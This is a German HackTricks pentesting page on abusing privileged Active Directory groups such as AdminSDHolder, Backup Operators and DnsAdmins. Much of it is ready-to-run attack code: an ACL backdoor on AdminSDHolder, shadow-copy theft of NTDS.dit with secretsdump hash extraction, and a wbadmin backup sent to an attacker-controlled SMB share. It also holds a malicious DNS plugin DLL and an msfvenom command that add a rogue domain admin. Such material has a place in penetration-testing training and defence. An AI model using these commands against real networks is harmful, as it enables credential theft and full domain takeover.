# Privilegierte Gruppen

{% hint style="success" %}
Lerne & übe AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lerne & übe GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstütze HackTricks</summary>

* Überprüfe die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Verwende [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection), um einfach **Workflows** zu erstellen und zu **automatisieren**, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden.\
Erhalte heute Zugang:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

## Bekannte Gruppen mit Administrationsrechten

* **Administratoren**
* **Domänen-Administratoren**
* **Enterprise-Administratoren**

## Konto-Betreiber

Diese Gruppe ist befugt, Konten und Gruppen zu erstellen, die keine Administratoren in der Domäne sind. Darüber hinaus ermöglicht sie die lokale Anmeldung am Domänencontroller (DC).

Um die Mitglieder dieser Gruppe zu identifizieren, wird der folgende Befehl ausgeführt:
```powershell
Get-NetGroupMember -Identity "Account Operators" -Recurse
```
Das Hinzufügen neuer Benutzer ist erlaubt, ebenso wie die lokale Anmeldung bei DC01.

## AdminSDHolder-Gruppe

Die Access Control List (ACL) der **AdminSDHolder**-Gruppe ist entscheidend, da sie die Berechtigungen für alle "geschützten Gruppen" innerhalb von Active Directory festlegt, einschließlich hochprivilegierter Gruppen. Dieser Mechanismus gewährleistet die Sicherheit dieser Gruppen, indem er unbefugte Änderungen verhindert.

Ein Angreifer könnte dies ausnutzen, indem er die ACL der **AdminSDHolder**-Gruppe ändert und einem Standardbenutzer vollständige Berechtigungen gewährt. Dies würde diesem Benutzer effektiv die volle Kontrolle über alle geschützten Gruppen geben. Wenn die Berechtigungen dieses Benutzers geändert oder entfernt werden, würden sie aufgrund des Designs des Systems innerhalb einer Stunde automatisch wiederhergestellt.

Befehle zur Überprüfung der Mitglieder und zur Änderung der Berechtigungen umfassen:
```powershell
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```
Ein Skript ist verfügbar, um den Wiederherstellungsprozess zu beschleunigen: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Für weitere Details besuchen Sie [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).

## AD Papierkorb

Die Mitgliedschaft in dieser Gruppe ermöglicht das Lesen von gelöschten Active Directory-Objekten, was sensible Informationen offenbaren kann:
```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### Domain Controller Access

Der Zugriff auf Dateien auf dem DC ist eingeschränkt, es sei denn, der Benutzer ist Teil der `Server Operators`-Gruppe, die das Zugriffslevel ändert.

### Privilege Escalation

Mit `PsService` oder `sc` von Sysinternals kann man die Berechtigungen von Diensten inspizieren und ändern. Die `Server Operators`-Gruppe hat beispielsweise die volle Kontrolle über bestimmte Dienste, was die Ausführung beliebiger Befehle und die Eskalation von Rechten ermöglicht:
```cmd
C:\> .\PsService.exe security AppReadiness
```
Dieser Befehl zeigt, dass `Server Operators` vollen Zugriff haben, was die Manipulation von Diensten für erhöhte Privilegien ermöglicht.

## Backup Operators

Die Mitgliedschaft in der Gruppe `Backup Operators` gewährt Zugriff auf das Dateisystem von `DC01` aufgrund der `SeBackup`- und `SeRestore`-Privilegien. Diese Privilegien ermöglichen das Durchqueren von Ordnern, das Auflisten und das Kopieren von Dateien, selbst ohne ausdrückliche Berechtigungen, unter Verwendung des `FILE_FLAG_BACKUP_SEMANTICS`-Flags. Für diesen Prozess ist die Nutzung spezifischer Skripte erforderlich.

Um die Gruppenmitglieder aufzulisten, führen Sie aus:
```powershell
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```
### Lokaler Angriff

Um diese Berechtigungen lokal zu nutzen, werden die folgenden Schritte durchgeführt:

1. Notwendige Bibliotheken importieren:
```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```
2. Aktivieren und überprüfen Sie `SeBackupPrivilege`:
```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```
3. Zugriff auf und Kopieren von Dateien aus eingeschränkten Verzeichnissen, zum Beispiel:
```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```
### AD Angriff

Der direkte Zugriff auf das Dateisystem des Domänencontrollers ermöglicht den Diebstahl der `NTDS.dit`-Datenbank, die alle NTLM-Hashes für Domänenbenutzer und -computer enthält.

#### Verwendung von diskshadow.exe

1. Erstellen Sie eine Schattenkopie des `C`-Laufwerks:
```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```
2. Kopiere `NTDS.dit` aus der Schattenkopie:
```cmd
Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```
Alternativ können Sie `robocopy` zum Kopieren von Dateien verwenden:
```cmd
robocopy /B F:\Windows\NTDS .\ntds ntds.dit
```
3. Extrahiere `SYSTEM` und `SAM` zur Hash-Abfrage:
```cmd
reg save HKLM\SYSTEM SYSTEM.SAV
reg save HKLM\SAM SAM.SAV
```
4. Alle Hashes aus `NTDS.dit` abrufen:
```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```
#### Verwendung von wbadmin.exe

1. Richten Sie das NTFS-Dateisystem für den SMB-Server auf der Angreifermaschine ein und speichern Sie die SMB-Anmeldeinformationen auf der Zielmaschine.
2. Verwenden Sie `wbadmin.exe` für die Systembackup und `NTDS.dit` Extraktion:
```cmd
net use X: \\<AttackIP>\sharename /user:smbuser password
echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
wbadmin get versions
echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

Für eine praktische Demonstration siehe [DEMO VIDEO WITH IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Mitglieder der **DnsAdmins**-Gruppe können ihre Berechtigungen ausnutzen, um eine beliebige DLL mit SYSTEM-Rechten auf einem DNS-Server zu laden, der häufig auf Domänencontrollern gehostet wird. Diese Fähigkeit ermöglicht erhebliches Ausnutzungspotenzial.

Um die Mitglieder der DnsAdmins-Gruppe aufzulisten, verwenden Sie:
```powershell
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```
### Führen Sie beliebige DLL aus

Mitglieder können den DNS-Server anweisen, eine beliebige DLL (entweder lokal oder von einem Remote-Share) mit Befehlen wie: zu laden
```powershell
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```
Das Neustarten des DNS-Dienstes (was zusätzliche Berechtigungen erfordern kann) ist notwendig, damit die DLL geladen werden kann:
```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```
Für weitere Details zu diesem Angriffsvektor siehe ired.team.

#### Mimilib.dll
Es ist auch möglich, mimilib.dll für die Ausführung von Befehlen zu verwenden, indem es modifiziert wird, um spezifische Befehle oder Reverse Shells auszuführen. [Überprüfen Sie diesen Beitrag](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) für weitere Informationen.

### WPAD-Datensatz für MitM
DnsAdmins können DNS-Datensätze manipulieren, um Man-in-the-Middle (MitM)-Angriffe durch das Erstellen eines WPAD-Datensatzes nach Deaktivierung der globalen Abfrageblockliste durchzuführen. Tools wie Responder oder Inveigh können zum Spoofing und Erfassen von Netzwerkverkehr verwendet werden.

### Event Log Readers
Mitglieder können auf Ereignisprotokolle zugreifen und möglicherweise sensible Informationen wie Klartextpasswörter oder Details zur Befehlsausführung finden:
```powershell
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```
## Exchange Windows Berechtigungen  
Diese Gruppe kann DACLs auf dem Domänenobjekt ändern und möglicherweise DCSync-Berechtigungen gewähren. Techniken zur Privilegieneskalation, die diese Gruppe ausnutzen, sind im Exchange-AD-Privesc GitHub-Repo detailliert beschrieben.
```powershell
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```
## Hyper-V-Administratoren
Hyper-V-Administratoren haben vollen Zugriff auf Hyper-V, was ausgenutzt werden kann, um die Kontrolle über virtualisierte Domänencontroller zu erlangen. Dazu gehört das Klonen von aktiven DCs und das Extrahieren von NTLM-Hashes aus der NTDS.dit-Datei.

### Ausbeutungsbeispiel
Der Mozilla Wartungsdienst von Firefox kann von Hyper-V-Administratoren ausgenutzt werden, um Befehle als SYSTEM auszuführen. Dies beinhaltet das Erstellen eines Hardlinks zu einer geschützten SYSTEM-Datei und das Ersetzen dieser durch eine bösartige ausführbare Datei:
```bash
# Take ownership and start the service
takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
sc.exe start MozillaMaintenance
```
Hinweis: Die Ausnutzung von Hardlinks wurde in den neuesten Windows-Updates gemindert.

## Organisation Management

In Umgebungen, in denen **Microsoft Exchange** bereitgestellt ist, hat eine spezielle Gruppe, die als **Organisation Management** bekannt ist, erhebliche Fähigkeiten. Diese Gruppe hat das Privileg, **auf die Postfächer aller Domänenbenutzer zuzugreifen** und hat **vollständige Kontrolle über die 'Microsoft Exchange Security Groups'** Organisationseinheit (OU). Diese Kontrolle umfasst die **`Exchange Windows Permissions`** Gruppe, die für Privilegieneskalation ausgenutzt werden kann.

### Privilegienausnutzung und Befehle

#### Druckeroperatoren
Mitglieder der **Druckeroperatoren** Gruppe sind mit mehreren Privilegien ausgestattet, einschließlich des **`SeLoadDriverPrivilege`**, das es ihnen ermöglicht, **lokal auf einen Domänencontroller zuzugreifen**, ihn herunterzufahren und Drucker zu verwalten. Um diese Privilegien auszunutzen, insbesondere wenn **`SeLoadDriverPrivilege`** in einem nicht erhöhten Kontext nicht sichtbar ist, ist es notwendig, die Benutzerkontensteuerung (UAC) zu umgehen.

Um die Mitglieder dieser Gruppe aufzulisten, wird der folgende PowerShell-Befehl verwendet:
```powershell
Get-NetGroupMember -Identity "Print Operators" -Recurse
```
Für detailliertere Ausbeutungstechniken im Zusammenhang mit **`SeLoadDriverPrivilege`** sollte man spezifische Sicherheitsressourcen konsultieren.

#### Remote Desktop Users
Die Mitglieder dieser Gruppe erhalten Zugriff auf PCs über das Remote Desktop Protocol (RDP). Um diese Mitglieder aufzulisten, stehen PowerShell-Befehle zur Verfügung:
```powershell
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```
Weitere Einblicke in die Ausnutzung von RDP finden sich in speziellen Pentesting-Ressourcen.

#### Remote Management Users
Mitglieder können PCs über **Windows Remote Management (WinRM)** zugreifen. Die Aufzählung dieser Mitglieder erfolgt durch:
```powershell
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```
Für Exploitationstechniken, die mit **WinRM** zusammenhängen, sollte spezifische Dokumentation konsultiert werden.

#### Server Operators
Diese Gruppe hat Berechtigungen, um verschiedene Konfigurationen auf Domänencontrollern durchzuführen, einschließlich Backup- und Wiederherstellungsprivilegien, Ändern der Systemzeit und Herunterfahren des Systems. Um die Mitglieder aufzulisten, wird der folgende Befehl bereitgestellt:
```powershell
Get-NetGroupMember -Identity "Server Operators" -Recurse
```
## References <a href="#references" id="references"></a>

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)
* [https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--](https://docs.microsoft.com/en-us/windows/desktop/secauthz/enabling-and-disabling-privileges-in-c--)
* [https://adsecurity.org/?p=3658](https://adsecurity.org/?p=3658)
* [http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/](http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/)
* [https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
* [https://rastamouse.me/2019/01/gpo-abuse-part-1/](https://rastamouse.me/2019/01/gpo-abuse-part-1/)
* [https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
* [https://github.com/tandasat/ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
* [https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
* [https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
* [https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
* [https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html](https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)

<figure><img src="/.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

Verwenden Sie [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=command-injection), um Workflows, die von den **fortschrittlichsten** Community-Tools der Welt unterstützt werden, einfach zu erstellen und **zu automatisieren**.\
Zugang heute erhalten:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=command-injection" %}

{% hint style="success" %}
Lernen & üben Sie AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Lernen & üben Sie GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Unterstützen Sie HackTricks</summary>

* Überprüfen Sie die [**Abonnementpläne**](https://github.com/sponsors/carlospolop)!
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos senden.

</details>
{% endhint %}
